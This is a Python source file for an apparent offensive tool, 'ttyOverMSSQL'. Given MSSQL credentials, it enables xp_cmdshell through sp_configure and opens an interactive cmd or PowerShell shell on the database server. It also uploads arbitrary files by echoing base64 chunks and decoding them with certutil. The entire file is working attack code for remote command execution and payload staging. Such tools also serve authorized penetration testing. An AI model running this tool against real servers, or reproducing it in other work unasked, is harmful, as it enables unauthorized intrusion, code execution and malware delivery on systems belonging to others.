from __future__ import print_function
import os
import sys
import shlex
import base64
import hashlib
import argparse
from io import open
from os.path import join, basename

from rich.console import Console
from rich import print
from rich.progress import Progress

from signal import signal, SIGINT

from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory

try:
    import _mssql
except ImportError:
    from pymssql import _mssql


class TTYOverMSSQL:

    DEFAULT_BUFFER_SIZE = 5 * 1024
    DEFAULT_TIMEOUT = 30

    def __init__(self, server, user, password, prompt_session, use_powershell=False):
        self.MSSQL_SERVER = server
        self.MSSQL_USERNAME = user
        self.MSSQL_PASSWORD = password
        self.buffer_size = self.DEFAULT_BUFFER_SIZE
        self.timeout = self.DEFAULT_TIMEOUT
        self.mssql = None
        self.stored_cwd = None
        self.username = None
        self.computername = None
        self.use_powershell = use_powershell
        self.myPromptSession = prompt_session
        self.console = Console()

    def info(self, msg):
        self.console.print(f"[[bold cyan]![/bold cyan]] {msg}")

    def success(self, msg):
        self.console.print(f"[[bold green]✓[/bold green]] {msg}")

    def warning(self, msg):
        self.console.print(f"[[bold yellow]![/bold yellow]] {msg}")

    def error(self, msg):
        self.console.print(f"[[bold red]X[/bold red]] {msg}")

    def connect_and_setup(self):
        """Connect to MSSQL database and enable xp_cmdshell."""
        self.mssql = _mssql.connect(
            server=self.MSSQL_SERVER,
            user=self.MSSQL_USERNAME,
            password=self.MSSQL_PASSWORD
        )
        self.success(f"Successful login: {self.MSSQL_USERNAME}@{self.MSSQL_SERVER}")
        self.info("Trying to enable xp_cmdshell...")
        self.mssql.execute_query(
            "EXEC sp_configure 'show advanced options',1;"
            "RECONFIGURE;"
            "EXEC sp_configure 'xp_cmdshell',1;"
            "RECONFIGURE;"
        )

    def process_result(self):
        """Parse result from last xp_cmdshell query."""
        rows = list(self.mssql)
        for row in rows[:-3]:
            col = list(row)[-1]
            print(row[col] if row[col] else "")
        if len(rows) >= 3:
            col = list(rows[-3])[-1]
            self.username, self.computername = rows[-3][col].split("|")
            self.cwd = rows[-2][col]
        return (self.username.rstrip(), self.computername.rstrip(), self.cwd.rstrip())

    def upload(self, local_path, remote_path):
        """Upload file to current working directory or to specific path."""
        self.info(f"Uploading {local_path} to {remote_path}")
        create_b64_cmd = f'type nul > "{remote_path}.b64"'
        self.mssql.execute_query(f"EXEC xp_cmdshell '{create_b64_cmd}'")

        with open(local_path, "rb") as f:
            data = f.read()
        md5sum = hashlib.md5(data).hexdigest()
        b64enc_data = b"".join(base64.encodebytes(data).split()).decode()

        progress = Progress()
        progress.start()
        
        total_chunks = (len(b64enc_data) + self.buffer_size - 1) // self.buffer_size
        upload_task = progress.add_task("[green]Uploading[/green]", total=total_chunks)

        for i in range(0, len(b64enc_data), self.buffer_size):
            chunk = b64enc_data[i : i + self.buffer_size]
            append_chunk_cmd = f'echo {chunk} >> "{remote_path}.b64"'
            self.mssql.execute_query(f"EXEC xp_cmdshell \'{append_chunk_cmd}\'")

            progress.update(upload_task, advance=1)

        progress.stop()

        decode_cmd = f'certutil -decode "{remote_path}.b64" "{remote_path}"'
        self.mssql.execute_query(f"EXEC xp_cmdshell 'cd {self.stored_cwd} & {decode_cmd} & echo %USERNAME%^|%COMPUTERNAME% & cd'")
        self.process_result()

        verify_cmd = f'certutil -hashfile "{remote_path}" MD5'
        self.mssql.execute_query(f"EXEC xp_cmdshell 'cd {self.stored_cwd} & {verify_cmd} & echo %USERNAME%^|%COMPUTERNAME% & cd'")
        rows = list(self.mssql)
        if any(md5sum in row[list(row)[-1]] for row in rows if row[list(row)[-1]]):
            self.success(f"MD5 hashes match: {md5sum}")
            self.mssql.execute_query(f"EXEC xp_cmdshell 'cd {self.stored_cwd} & del {remote_path}.b64'")
        else:
            self.error("MD5 hashes do NOT match.")

    def build_exec_query(self, cmd):
        """Build cmd or powershell xp_cmdshell query."""
        cmd = cmd.replace("'", "''")

        if self.use_powershell:
            return (
                f"""EXEC xp_cmdshell 'powershell -Command "cd {self.stored_cwd} ; ({cmd}|Out-String) ; Write-Host $($env:USERNAME + ''|'' + $env:COMPUTERNAME) ; [string](pwd)"'"""
            )
        else:
            return (
                f"""EXEC xp_cmdshell 'cd {self.stored_cwd} & {cmd} & echo %USERNAME%^|%COMPUTERNAME% & cd'"""
            )

    def get_prompt_string(self):
        """Return cmd prompt or powershell prompt."""
        if self.use_powershell:
            return f"PS {self.cwd}> "
        else:
            return f"{self.cwd}> "

    def shell(self):
        """Start interactive session."""
        try:
            self.connect_and_setup()
            self.mssql.execute_query("EXEC xp_cmdshell 'echo %USERNAME%^|%COMPUTERNAME% & cd'")
            self.username, self.computername, self.cwd = self.process_result()
            self.stored_cwd = self.cwd

            while True:
                cmd = self.myPromptSession.prompt(self.get_prompt_string()).rstrip("\n").replace("'", "''")
                if not cmd:
                    cmd = "call"

                if cmd.lower().startswith("exit"):
                    self.warning("Exiting shell.")
                    self.mssql.close()
                    return

                elif cmd.upper().startswith("UPLOAD"):
                    upload_cmd = shlex.split(cmd, posix=False)
                    if len(upload_cmd) < 2:
                        self.warning("Usage: UPLOAD <local_path> [remote_path]")
                        continue
                    local_path = upload_cmd[1]
                    if len(upload_cmd) == 2:
                        remote_file_name = basename(local_path)
                        remote_path = f"{self.stored_cwd}\\{remote_file_name}"
                    else:
                        remote_path = upload_cmd[2]

                    self.upload(local_path, remote_path)
                    self.success("Upload procedure finished.")

                else:
                    exec_query = self.build_exec_query(cmd)
                    self.mssql.execute_query(exec_query)
                    self.username, self.computername, self.cwd = self.process_result()
                    self.stored_cwd = self.cwd

        except _mssql.MssqlDatabaseException as e:
            self.error(f"MSSQL failed: {e}")
        except KeyboardInterrupt:
            self.warning("Ctrl-C detected. Closing connection.")
            sys.exit(0)
        finally:
            if self.mssql:
                self.mssql.close()

def handler(sig, frame):
    print("[X] Stoping.")
    exit(1) 

def main():
    
    signal(SIGINT, handler)

    HOME_DIR = os.environ.get('HOME') or os.environ.get('USERPROFILE') or "C:\\Users\\Public"
    HISTORY_FILE = join(HOME_DIR, ".ttyOverMSSQLHistory")

    myPromptSession = PromptSession(history=FileHistory(HISTORY_FILE))

    parser = argparse.ArgumentParser(description="ttyOverMSSQL")
    parser.add_argument("-s", "--server", required=True, help="MSSQL server address")
    parser.add_argument("-u", "--user", required=True, help="MSSQL username")
    parser.add_argument("-p", "--password", required=True, help="MSSQL password")
    parser.add_argument("--powershell", action="store_true", help="Spawn PowerShell instead cmd")
    args = parser.parse_args()

    session = TTYOverMSSQL(args.server, args.user, args.password, use_powershell=args.powershell, prompt_session=myPromptSession)
    session.shell()

if __name__ == "__main__":
    main()
